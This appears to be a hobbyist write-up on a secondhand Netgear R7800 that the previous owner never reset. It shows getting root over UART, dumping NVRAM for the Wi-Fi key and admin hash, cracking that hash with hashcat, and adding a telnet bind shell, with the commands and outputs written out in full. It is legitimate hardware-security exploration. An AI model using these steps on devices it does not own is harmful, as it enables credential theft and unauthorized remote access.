# netgear
Notes for Netgear R7800

# Thirfting
I found a Netgear R7800 at a local thrift store, it was priced at $9.99 but it was 20% off day so I was out the door for less than $9 after tax.
<img src="https://github.com/maguireja/netgear/blob/b1546eec3635e6b43bf14a6fd5d3226c1ab586a2/netgear.png">

# Powering up
I plugged in the router and to my surprise, the router had not been reset to a factory default before being donated. I observed the following SSID broadcasted:
<img src="https://github.com/maguireja/netgear/blob/92d5ef63adb5aaa382886b7a4d19818efef5f901/SSID.png">
...do with that what you will...

# Password Recovery
Now that I realized the router was still configured, I wondered if I could recover the password for the wireless network, as well as any other configured passwords. I followed along with Matt Brown's video here which was fantastic. I recommend subscribing to Matt's channel he has some really good content.
Video here: https://youtu.be/7iuwY3hIcHw?si=osBN4qiOezMgb0qB

# Locating UART
I opened up the case and found four pins that look like UART, but they were not labeled. I was able to follow the steps in Matt's video and use a multimeter to locate the Ground, Send and Recieve pins.
<img src="https://github.com/maguireja/netgear/blob/4a948d08c5084d1741fed89ba6b057aac21a280b/R7800%20pins.png">

Next I used a Flipper Zero and a laptop running Kali Linux to connect to the UART port. I used the Flipper's USB-UART Bridge Module with the following config:
```
Baud 115200
```

# Dumping NVRAM
On the Kali laptop I ran the following command to locate the flipper:
```
ls /dev/serial/by-id
```
The output of this command should provide you with the unique name for your flipper. With that you can run the following screen command to enter in to the UART port:
```
screen /dev/serial/by-id/usb-Flipper_Devices_Inc.Flipper_UNIQUE_ID_HERE
```
After running the screen command and letting the netgear boot up, I was dropped into an root shell on the netgear:
```
BusyBox v1.4.2 (2018-12-10 10:26:59 UTC) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

     MM           NM                    MMMMMMM          M       M
   $MMMMM        MMMMM                MMMMMMMMMMM      MMM     MMM
  MMMMMMMM     MM MMMMM.              MMMMM:MMMMMM:   MMMM   MMMMM
MMMM= MMMMMM  MMM   MMMM       MMMMM   MMMM  MMMMMM   MMMM  MMMMM'
MMMM=  MMMMM MMMM    MM       MMMMM    MMMM    MMMM   MMMMNMMMMM
MMMM=   MMMM  MMMMM          MMMMM     MMMM    MMMM   MMMMMMMM
MMMM=   MMMM   MMMMMM       MMMMM      MMMM    MMMM   MMMMMMMMM
MMMM=   MMMM     MMMMM,    NMMMMMMMM   MMMM    MMMM   MMMMMMMMMMM
MMMM=   MMMM      MMMMMM   MMMMMMMM    MMMM    MMMM   MMMM  MMMMMM
MMMM=   MMMM   MM    MMMM    MMMM      MMMM    MMMM   MMMM    MMMM
MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
  MMMMMMM:      MMMMMMM     M         MMMMMMMMMMMM  MMMMMMM MMMMMMM
    MMMMMM       MMMMN     M           MMMMMMMMM      MMMM    MMMM
     MMMM          M                    MMMMMMM        M       M
       M
 ---------------------------------------------------------------
   For those about to rock... (%C, %R)
 ---------------------------------------------------------------
root@R7800:/#
```
Next I ran the <i>show nvram</i> command from Matt's video, and I found the following entries in the output:
```
wl_wpa2_psk=[REDACTED]
wla_wpa2_psk=[REDACTED]
```
The two redacted values were the same, I tested them out and they were the pre shared key for the wireless network.

# Password Cracking
While I had found the preshared key for the network, I did not have the admin password to log in to the routers web management portal. I tried the preshared key thinking the previous owner would just reuse the same password, but they did not. Looking through the output of the <i>show nvram</i> command, I saw the following lines:
```
http_passwd_digest=[REDACTED]
http_passwd=[REDACTED]
```
Similiar to the preshared key, both redacted strings were the same. But they were not plaintext passwords, they looked like hashed or encoded passwords. I checked them with Hash ID:
```
$hashid hash
Analyzing 'REDACTED'
[+] Snefru-256
[+] SHA-256
[+] RIPEMD-256
[+] Haval-256
[+] GOST R 34.11-94
[+] GOST CryptoPro S-Box
[+] SHA3-256
[+] Skein-256
[+] Skein-512(256)
--End of file 'hash'--
```

The only hash type here that I'm remotely familiar with is SHA-256, so I thought I'd take a chance and try cracking the string as a SHA-256 hash.  I used Hashcat with the rockyou2024 wordlist and the rockyou-30000 ruleset:
```
./hashcat.bin -a 0 -m 1400 test-hash ~/tools/wordlists/rockyou2024.txt -r rules/rockyou-30000.rule
```
After nearly a full day, I had cracked the hash and recovered the plaintext password:
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 47521790546b87fbff76c89e3af8433af43c0f26734edbefc44...21eccf
Time.Started.....: Tue Feb 11 09:39:52 2025 (21 hours, 18 mins)
Time.Estimated...: Wed Feb 12 06:58:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/hpn/tools/wordlists/rockyou2024.txt)
Guess.Mod........: Rules (rules/rockyou-30000.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1854.6 MH/s (11.94ms) @ Accel:64 Loops:256 Thr:32 Vec:1
Speed.#2.........:   993.0 MH/s (10.39ms) @ Accel:128 Loops:64 Thr:64 Vec:1
Speed.#*.........:  2847.5 MH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 173279177015296/298457185890000 (58.06%)
Rejected.........: 0/173279177015296 (0.00%)
Restore.Point....: 5775478784/9948572863 (58.05%)
Restore.Sub.#1...: Salt:0 Amplifier:7936-8192 Iteration:0-256
Restore.Sub.#2...: Salt:0 Amplifier:16704-16768 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#1....: cami1212nd806 -> camlin8657275
Candidates.#2....: kamille_09rose1 -> camilosantamari101
Hardware.Mon.#1..: Temp: 78c Fan: 95% Util: 99% Core:1875MHz Mem:6800MHz Bus:16
Hardware.Mon.#2..: Temp: 73c Fan: 60% Util: 99% Core:1923MHz Mem:4513MHz Bus:4

Started: Tue Feb 11 09:39:51 2025
Stopped: Wed Feb 12 06:58:08 2025
```

# Adding a bind shell
While the UART interface is cool, it would be more convient to connect to the device through a shell. An easy way to do this is to add a new binary to the device. 

There's a really nice repo of precompiled binaries here:
https://github.com/therealsaumil/static-arm-bins

I could not get wget or curl to work on the router itself, wget gave the following error:
```
root@R7800:~# wget https://github.com/therealsaumil/static-arm-bins/raw/refs/heads/master/telnetd-static
https://github.com/therealsaumil/static-arm-bins/raw/refs/heads/master/telnetd-static: HTTPS support not compiled in.
```

Curl just failed to download the file, when I enabled verbose output it looked like there were SSL errors. It seems like the versions of curl and wget are too old for github. I didn't troubleshoot this all the much, I just downloaded the binary to my laptop and served it to the router from there:
```
hroot@R7800:~# wget ttp://192.168.1.3:8000/telnetd-static
Connecting to 192.168.1.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 541964 (529K) [application/octet-stream]
Saving to: `telnetd-static'

100%[======================================>] 541,964     --.-K/s   in 0.01s   

2025-02-18 17:20:04 (45.0 MB/s) - `telnetd-static' saved [541964/541964]

```
Then run the binary after downloading:
```
root@R7800:~# ./telnetd-static -p 1234
```

On the laptop, use the telnet client to connect to the new telnet server:
``` telnet 192.168.1.1 1234
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
 === LOGIN ===============================
  Please enter your password,It's the same
  with DUT login password
 ------------------------------------------
telnet password:[REDACTED]
=== IMPORTANT ============================
 Use 'passwd' to set your login password
 this will disable telnet and enable SSH
------------------------------------------


BusyBox v1.4.2 (2018-12-10 10:26:59 UTC) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

     MM           NM                    MMMMMMM          M       M
   $MMMMM        MMMMM                MMMMMMMMMMM      MMM     MMM
  MMMMMMMM     MM MMMMM.              MMMMM:MMMMMM:   MMMM   MMMMM
MMMM= MMMMMM  MMM   MMMM       MMMMM   MMMM  MMMMMM   MMMM  MMMMM'
MMMM=  MMMMM MMMM    MM       MMMMM    MMMM    MMMM   MMMMNMMMMM
MMMM=   MMMM  MMMMM          MMMMM     MMMM    MMMM   MMMMMMMM
MMMM=   MMMM   MMMMMM       MMMMM      MMMM    MMMM   MMMMMMMMM
MMMM=   MMMM     MMMMM,    NMMMMMMMM   MMMM    MMMM   MMMMMMMMMMM
MMMM=   MMMM      MMMMMM   MMMMMMMM    MMMM    MMMM   MMMM  MMMMMM
MMMM=   MMMM   MM    MMMM    MMMM      MMMM    MMMM   MMMM    MMMM
MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
  MMMMMMM:      MMMMMMM     M         MMMMMMMMMMMM  MMMMMMM MMMMMMM
    MMMMMM       MMMMN     M           MMMMMMMMM      MMMM    MMMM
     MMMM          M                    MMMMMMM        M       M
       M
 ---------------------------------------------------------------
   For those about to rock... (%C, %R)
 ---------------------------------------------------------------
```
And it works! It does require a password, and the password is the same password for the web interface. I am not sure how exactly the new telnet server knows where to find this password. This needs more research
